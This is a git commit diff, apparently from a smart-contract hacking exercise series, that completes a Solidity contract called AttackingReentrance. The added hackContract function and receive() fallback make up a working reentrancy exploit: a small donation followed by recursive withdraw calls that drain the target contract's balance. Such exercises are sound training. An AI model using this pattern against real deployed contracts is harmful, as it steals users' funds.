36575910a29b05dabdbfcc072dba59848954fd9b
maks-p <mpazuniak@gmail.com>
2022-07-21 15:15:54 -0400

    Complete Reentrance

--- contracts/6. Reentrance/AttackingReentrance.sol
+++ contracts/6. Reentrance/AttackingReentrance.sol
@@ -4,12 +4,22 @@ import "./Reentrance.sol";
 
 contract AttackingReentrance {
     address payable public contractAddress;
-
+    Reentrance reentrance;
+    
     constructor(address payable _contractAddress) payable {
         contractAddress = _contractAddress;
     }
 
-    function hackContract() external {
+    function hackContract() external payable {
         // Code me!
+        reentrance = Reentrance(contractAddress);
+        reentrance.donate{value: 1}(address(this));
+        reentrance.withdraw();
     }
+
+    receive() external payable {
+        if (address(reentrance).balance > 0) {
+            reentrance.withdraw();
+        }
+    }    
 }
